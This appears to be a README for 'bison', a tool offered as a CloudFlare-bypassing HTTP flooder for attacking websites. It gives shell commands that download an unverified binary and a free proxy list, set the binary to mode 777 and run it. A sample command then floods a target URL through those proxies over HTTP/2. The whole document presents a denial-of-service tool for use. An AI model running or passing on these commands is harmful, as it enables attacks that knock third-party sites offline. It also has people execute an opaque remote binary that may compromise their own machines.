# bison-cf-bypass
Bison CloudFlare bypass flooder | UP TO DATE 2025

### Installation

```shell
apt install unzip wget -y
wget https://github.com/lincolnTOP/bison-cf-bypass/raw/refs/heads/main/bison.zip
wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text"
unzip bison.zip
chmod 777 bison
rm -rf bison.zip
```

### Usage
To use the script, run the following command in your terminal:
```shell
./bison GET "https://example.com" 60 1 5 proxy.txt --delay 1 --debug --http 2 --parsed --query 1
```

Proxies are downloading automatically also
./bison for options
